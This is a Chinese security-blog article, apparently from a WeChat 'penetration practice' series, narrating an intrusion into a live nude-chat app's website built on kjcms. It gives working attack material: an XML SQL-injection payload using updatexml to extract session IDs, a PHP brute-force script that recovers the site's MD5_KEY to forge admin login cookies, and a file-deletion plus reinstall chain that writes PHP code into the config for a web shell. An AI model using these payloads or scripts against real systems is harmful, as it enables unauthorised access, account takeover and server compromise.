> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ckmM9DDnokalyP4EjGwcMg)

\ 涉及知识点:

```
app抓包找服务器地址，夜游神+bp
js的文件特征去githu找源代码
源代码审计，sql注入
时间盲注和布尔盲注
伪造cookie,登录后台
重装漏洞，getshell
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTIjWoeG3SicNhMHpUqNpSgr7SUZQcHRAoyHoicyBwkgQI938CCvMQRDgT0LIPp35bVlYQTZ6xNN0Ng/640?wx_fmt=png)

打开链接，发现是一个裸聊的 app 下载，夜神 + burp 抓包，  

获取到网址，通过 js 的文件特征去 github 查找源码文件。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgR5I96ibv29OxvcZQvVZl0BeA8EicH6bB28vYyvgy4bdKtYbazsibFKaEAQ/640?wx_fmt=png)

根据代码发现他是一个 kjcms，然后去官网下载源码来进行审计

#### **sql 注入**

在 cls_weixin::on_exe 方法中，有许多执行 sql 语句的点

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRUOZLppwcXLUCpD9CucuWSGhYTjpC4zk6mKribRLrNXwuRMpIicVcA3cA/640?wx_fmt=png)

这里注入需要满足 $arr_msg[‘FromUserName’] 可控，发现 $arr_msg 变量调用了当前类的 get_msg() 方法，跟进这个方法：

```
static function get_msg() {
    $arr_return = array();
    $cont = file_get_contents("php://input");
    //$cont = file_get_contents(KJ_DIR_ROOT . "/test.txt");
    if(empty($cont)) return $arr_return;
    $request = simplexml_load_string($cont , 'SimpleXmlElement' , LIBXML_NOCDATA);
    $arr_return = fun_format::toarray($request);
    return $arr_return;
}
```

发现 $cont 是通过 post 数据流获取的，传入的 xml，继续跟进 fun_format::toarray

```
static function toarray($cont) {
    if(gettype($cont) == "string") $cont = json_decode($cont);
    $arr = (array)$cont;
    foreach($arr as $item=>$key) {
        if(gettype($key) == 'object' ) {
            $key = self::toarray($key);
        } else if(gettype($key) == 'array'){
            $key = self::objtoarray($key);
        }
        $arr[$item] = $key;
    }
    return $arr;
}
```

这里不太重要，只是把 xml 的值转化为数组，所以在 on_exe 方法中的 $arr_msg 数组是可控的，即可以产生 sql 注入，经过本地测试发现，在 on_exe 方法中的数据查询很多都不存在表，这里发现一个点：

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRDwjtx3Yt6iaNZ0j0KAHsVvSiaAlRIVVCWib67ib9iaty3aMwDNEnGg12Dow/640?wx_fmt=png)

跟进 tab_weixin_message::get_one 方法，参数 $key 是我们可控的，参数 $site_id 无关紧要

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRVianhgdCicCCbmUNmQTiatb0Dj2lvjOwtDbTiabbv0QFrPvRQWypZAvOWw/640?wx_fmt=png)

全局查找 cls_weixin::on_exe，在根目录 weixin.php 调用了这个方法

```
<?php
include("inc.php");
if(isset($_GET["echostr"])) {
    echo $_GET["echostr"];exit;
}
cls_weixin::on_exe();
```

现在就只需要构造 payload 了，这里要进入到执行 tab_weixin_message::get_one 方法，需要进过：

```
issert($arr_msg['ToUserName'])->issert($arr_msg['FromUserName'])->$arr_msg['MsgType'] == 'event'->$arr_msg['Event']) == 'click'
```

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRytEI8WWqjjkNahJ5Qak6ILbBYpouoBMKg9nz7og0hiakmibZGbC2WIEA/640?wx_fmt=png)

这个点只能时间盲注，在我本地测试的时候可以通过 updatexml(1,if(({}),0x7c,1),1) 的方法来实现时间盲注变成布尔注入，目标环境问题无法实现，我就写了个脚本去跑账号密码。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgR6qNPLMeK241v26cZysQQGhVLdlwrPJHR6aebjWmX4aHlrOpoRktchQ/640?wx_fmt=png)

发现自己傻逼了，在目录文件中会生成数据库报错的文件，路径为：/data/error/db_query/2020_09_16.txt(年份_月份_日. txt)

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgROAu23shntgaWUic1GVKW5G6xzgtmcn1rKJPPkQFq3V5S275kUIryUNQ/640?wx_fmt=png)

知道表结构和字段，直接去目标站注入，拿到后台密码 hash，发现解密不了，看了下代码，有盐，是通过 md5(pass + 盐) 进行加密的，这里盐也是在密码表中可以看到的，发现也解密不了。

#### **伪造 cookie**

在登录处，发现 cookie 中的 kj_s_id 和 kj_login_time 是用来登录的，感觉可以伪造，这里我跟进下代码，看下 kj_s_id 是怎么生成的，验证登录处代码：

```
function act_login_verify() {
        $arr_return = $this->on_login_verify();
        return fun_format::json($arr_return);
    }
```

跟进 on_login_verify 方法

```
function on_login_verify() {
    $arr_return = array("code" => 0 , "id"=>0 , "msg" => cls_language::get("login_ok"));
    $arr_fields = array(
        "user_name" => fun_get::post("uname"),
        "user_pwd"   => fun_get::post("pwd"),
        "verifycode" => fun_get::get("verifycode"),
        "autologin" => fun_get::get("autologin")
    );
    if(!fun_is::pwd($arr_fields["user_pwd"])) {
        $arr_return["code"] = 7;
        $arr_return["msg"]  =  fun_get::rule_pwd("tips");
        return $arr_return;
    }
    $arr = cls_obj::get("cls_user")->on_login($arr_fields);
    if( $arr["code"] != 0 ) {
        $arr_return = $arr;
        return $arr_return;
    }
    return $arr_return;
}
```

$arr_fields 数组中获取登录的账号密码，继续跟进 on_login 方法

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgR42hEDCbEXicXFTibbj4EVDXyIypVq5ibtCSecfxW7FFow75vlOO9qFkPQ/640?wx_fmt=png)

$str_id 是通过 fun_get::safecode 方法来的，现在只需要 $perms[‘sid’] 是怎么来的，跟进查看，并没发现到什么，这里，我直接打印出 self::$perms[‘sid’] 的值，发现是 ip + 时间戳 + 随机数的形式

```
echo self::$perms['sid'];exit;
```

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRQegqulLicF9nJ0h3Bno0icibugfylfiaKmrjiaicXwWBrCwBR1ptvHR4yKMQ/640?wx_fmt=png)

发现这里数据存放在数据库的 kj_sys_session 表中的 session_id 字段，而 session_user_id 表示是否登录在，1 表示登录在，0 表示退出了登录。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRmABBIjic2E3O7dkCZzficP3uFs3BpiaCE1VdFY0kI8HeGNlboLtuAwciaQ/640?wx_fmt=png)

我们有注入点，这个 session_id 我们可以通过注入来获取到的，现在跟进 fun_get::safecode 方法，看 cookie 中的 kj_s_id 是怎么加密的

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRzkGvickAAIjqcuqGrFliccPe8ssRTiccry4kb6NiatglASIiavrhZvHoDJQ/640?wx_fmt=png)

跟进 $str_key 变量，看他是从哪里来的，跟进 cls_config::MD5_KEY，发现他来自 data\config\cfg.env.online.php 中的 MD5_KEY 常量。而这个常量是安装的时候随意 random 的五位数

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRCtATuxcuwl7v5HyFoOcFwhibicw1was9fnjhibOs9cDiamRkiar6hfEQPzg/640?wx_fmt=png)

最后获取的 $str_return 是由 3 部分组成 $str_left，base64($msg_val)，$str_right，所以这个 $str_key 变量需要我们继续爆破，并且知道 fun_get::safecode 方法的 $msg_val 参数是 ip + 时间戳 + 随机数的形式，下面就进行漏洞复现。

#### **漏洞复现**

首先抓取目标站后台登录时的 cookie，如：NgMTE5LjYyLjEyNC4yMTE1OTgzNTI1NDM4NzUYTBjZmVkN2ZmMzY2OTYzYg，假设我的 ip 地址为`104.192.225.86`，通过 base64 为`MTAzLjE5Mi4yMjUuODY=`，去掉 =。本地经过测试发现 ip + 时间戳 + 随机数通过 base64 编码后为 36 位，所以上面的加密密文就为：

```
Ng
MTE5LjYyLjEyNC4yMTE1OTgzNTI1NDM4NzUY
TBjZmVkN2ZmMzY2OTYzYg
```

我们通过注入获取 $msg_val 参数和登录状态

```
<?xml version="1.0"?>
<note>
    <ToUserName>cccc</ToUserName>
    <FromUserName>1</FromUserName>
    <MsgType>event</MsgType>
    <Event>click</Event>
    <EventKey>1' and updatexml(1,concat(0x7e,(select concat(session_id,0x7e,session_user_id) from `kj_sys_session` order by session_user_id desc limit 0,1),0x7e),1)#</EventKey>
</note>
```

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRjjLHIP3icnTlxeCoLSIgufRNzsibNnFxLQNDOQFhibreKNEafIfjqa22w/640?wx_fmt=png)

成功读取到了，这里就需要爆破 MD5_KEY，他是五位数的，用他的代码修了下 php 的爆破脚本

```
<?php
function safecode($msg_val,$msg_type="encode",$str_key_val = '36118'){ // 192.168.50.1351600069125552
        $str_key       = $str_key_val;
        $str_en_key    = base64_encode($str_key);
        $str_md5_key   = md5($str_key);
        $str_md5_key_1 = substr($str_md5_key , 0 , 1);
        $str_md5_key_2 = substr($str_md5_key , -1 , 1);
        $lng_key_1     = ord($str_md5_key_1);
        $lng_key_2     = ord($str_md5_key_2);
        $lng_x_key1    = substr($lng_key_1,-1,1);
        if($lng_key_1 > 9) {
            $lng_x_key2 = intval(substr($lng_key_1 , -2 , 1)) + $lng_x_key1;
        }else{
            $lng_x_key2 = $lng_x_key1 * 2;
        }
        $str_left      = base64_encode(substr($str_md5_key , $lng_x_key1 , $lng_x_key2));
        $lng_2_key1    = substr($lng_key_2 , -1 , 1);
        if($lng_2_key1 > 9){
            $lng_2_key2 = intval(substr($lng_key_2 , -2 , 1)) + $lng_2_key1;
        }else{
            $lng_2_key2 = $lng_2_key1 * 2;
        }
        $str_right = base64_encode(substr($str_md5_key , -$lng_2_key2));
        if($msg_type == "encode"){
            $str_en_id   = base64_encode($msg_val);
            $str_en_code = $str_left . $str_en_id . $str_right;
            $str_return  = str_replace("=" , "" , $str_en_code);
        }else{
            $str_left    = str_replace("=" , "" , $str_left);
            $str_right   = str_replace("=" , "" , $str_right);
            $str_llen    = strlen($str_left);
            $str_rlen    = strlen($str_right);
            $str_len     = strlen($msg_val);
            if($str_len < ($str_llen + $str_rlen)){
                $str_return = "";
            }else{
                $str_return = base64_decode(substr($msg_val , $str_llen , -$str_rlen));
            }
        }
        return $str_return;
    }


function getNumber($start=1,$end=99999){
    for ($i=$start; $i <= $end; $i++) { 
        $arr[] = substr(str_repeat("0",6).$i,-5,5);
    }
    return $arr;
}

$numbers= getNumber(1,99999);
foreach ($numbers as $val){
    $keyss = safecode('105.112.215.421600227695831','encode',$val)."<br />";
    echo $keyss.':'.strval($val)."<br />";
    if ($keyss == 'NgMTAzLjE5Mi4yMjUuNDIxNjAwMjI3Njk1ODMxYTBjZmVkN2ZmMzY2OTYzYg'){
        echo $val;
        exit;
    }
}
```

成功获取到了 MD5_KEY，然后我们在通过这个脚本利用这个 MD5_KEY 来生成 kj_s_id

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRaX8Cotz76WFxaD7rxTmUnMYUQw5rWUpcicxSMwtc1wDbwZF4vEfDEIg/640?wx_fmt=png)

最后就可以伪造 cookie 登录后台了

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgR3Y2DOXhxrgibPMc5gMGhES52cr51k6kcpDpwcDs3uzsRGqFIRobmia0A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgR1kk0SAxnmsH5kSaJpicdk3XUN1APN2feNDaAaPhLUCA5NrC9eafxb7A/640?wx_fmt=png)

#### **重装漏洞 getshell**

本来以为后台可以直接修改文件上传的后缀，发现事情并没有那么简单

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRs42Do5VVd6KHJBEayH6Hc8TPr2XX5GXpNS2sz5xxvTeJ4fpXjPUL5g/640?wx_fmt=png)

发现还是限制了 php 无法上传，跟进这部分代码看了下，lib\tab\tab.other.attatch.php

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRnhOlYTwEd1FNhoOsRKrrV3FflUOsiaCOuictRib5fNYpd4OLrIBVnKyjA/640?wx_fmt=png)

这里会先获取上传文件的后缀，来判断后缀是否存在 $arr_no_allow_ext 数组中，所以会先判断数组里面的上传类型，在判断允许上传的类型。这里只有针对 windows 可以 getshell 了，我们将上传类型修改成 php(空格)，由于 windows 特性，会把空格去掉。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRRrfvHib3s5bDw6S6Tt0A0IicbXarxrdfpKCibLGZp9UCjicSl9Sxg3gHRQ/640?wx_fmt=png)

然而我们的目标是 linux，这种方式不行了，再回来看看代码后台是否有 getshell 的点，除了在重新安装的点就没发现可以 shell 的点了（自己太菜了，找到不影响正常功能 shell 的点）。在文件 app\model\install\mod.index.php 中的 on_config 方法：

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRSHk8NP69TpQdJMbMHWLKDNu5yJgVqibDPfNRKia3iaSqys1mSZNB1ljJA/640?wx_fmt=png)

mysql 的账号密码是通过 file_put_contents 函数写入到配置文件 \ data\config\cfg.env.online.php，并没有通过这个 cms 的过滤函数`fun_get::get/post`方法，这个方法过滤如下：

```
static function filter_base($str_x , $is_reback=false) {
    $search = array("&","&","/amp;/amp;/amp;",'"',"'","<",">",chr(13).chr(10));
    $replace = array("/amp;/amp;/amp;","&","&",""","'","<",">",chr(13));
    if($is_reback) {
        $str_x = str_replace($replace , $search , $str_x);
        $str_x = str_replace('\\\'',"'",$str_x);//替换经过mysql转义的格式
        $str_x = str_replace('\\"','"',$str_x);
    }else{
        $str_x = str_replace($search , $replace , $str_x);
    }
    return $str_x;
}
```

全局查了下，$is_reback 参数都是为默认的 false，为 true 的话，这个过滤就没啥影响了。现在重装漏洞的点可以实现了，需要一处任意文件删除来将 \ data\install.inc 锁文件进行删除就可以重新安装了。在后台系统日志处，有一次日志文件删除的点，这个点不用看代码都知道可以删除，因为在`fun_get::get/post`方法中并没有过滤`/``.`。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRQR9iaZR0I2ep2x4D6NGz2xiaZSiaQticLkBphibsUoEq822yTahZ69kjGJg/640?wx_fmt=png)

删除了 install.inc 锁文件就可以进行重新安装了。在数据库名填上我们的任意 php 代码，就可以 shell 了。

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nZOA4RNx5uMP82mXCpVChgRXczZthu9icUUT9Z3cy1KOtFib6dOOYAwyFj5b1AMrnkmzfyjzPBJsD8A/640?wx_fmt=png)

重装漏洞虽然可以拿下 shell

但是不推荐使用重装漏洞

会影响正常网站的数据

作者：Admin Team

**推荐阅读：**

  

_**渗透实战系列**_

  

  

▶[【渗透实战系列】｜15 - 博彩网站（APP）渗透的常见切入点](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486411&idx=1&sn=e5227a9f252f797bf170353d18222d6a&chksm=ce67a152f9102844551cf537356b85a6920abb084d5c6a26f7f8aea6870f51208782ac246ee2&scene=21#wechat_redirect)

▶[【渗透实战系列】｜14 - 对诈骗（杀猪盘）网站的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486388&idx=1&sn=cfc74ce3900b5ae89478bab819ede626&chksm=ce67a12df910283b8bc136f46ebd1d8ea59fcce80bce216bdf075481578c479fefa58973d7cb&scene=21#wechat_redirect)

▶[【渗透实战系列】｜13-waf 绕过拿下赌博网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486335&idx=1&sn=4cb172171dafd261c287f5bb90c35249&chksm=ce67a1e6f91028f08de759e1f8df8721f6c5a1e84d8c5f0948187c0c5b749fa2acdd4228b8e7&scene=21#wechat_redirect)

▶[【渗透实战系列】｜12 - 渗透实战， 被骗 4000 花呗背后的骗局](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486245&idx=1&sn=ebfcf540266643c0d618e5cd47396474&chksm=ce67a1bcf91028aa09435781e951926067dcf41532dacf9f6d3b522ca2df1be8a3c8551c1672&scene=21#wechat_redirect)

▶[【渗透实战系列】｜11 - 赌博站人人得而诛之](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486232&idx=1&sn=301810a7ba60add83cdcb99498de8125&chksm=ce67a181f9102897905ffd677dafeb90087d996cd2e7965300094bd29cba8f68d69f675829be&scene=21#wechat_redirect)

▶[【渗透实战系列】|10 - 记某色 X 商城支付逻辑漏洞的白嫖（修改价格提交订单）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486060&idx=1&sn=a4b977e9e3bbfe7b2c9ec479942e615c&chksm=ce67a0f5f91029e30c854eb2f71173efe925a38294fd39017708abcf4deea5c2b25dee518ebf&scene=21#wechat_redirect)

▶[【渗透实战系列】|9 - 对境外网站开展的一次 web 渗透实战测试（非常详细，适合打战练手）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486042&idx=1&sn=4022c7f001ca99dc6837d51b759d5104&chksm=ce67a0c3f91029d5f1ac9dc24d23cb390630db1cc3f8e76398cf097a50e29e0b98e9afcb600a&scene=21#wechat_redirect)

▶[【渗透实战系列】|8 - 记一次渗透测试从 XSS 到 Getshell 过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7 - 记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

▶[【渗透实战系列】|6- BC 杀猪盘渗透一条龙 (文末附【渗透实战系列】其他文章链接)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5 - 记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4 - 看我如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3 - 一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2 - 记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1 一次对跨境赌博类 APP 的渗透实战（getshell 并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg)  

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONRHbDcqVCY8LR0Y5uDpRzUdh4kN8gRTPLYhNib2rHTJFT9cJ77DRe7tbyjP3mfuRk0P8PKPqdWUbkw/640?wx_fmt=jpeg)

**Hacking 黑白红**

一个专注信息安全技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif)

**点分享**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif)

**点收藏**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif)

**点点赞**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif)

**点在看**
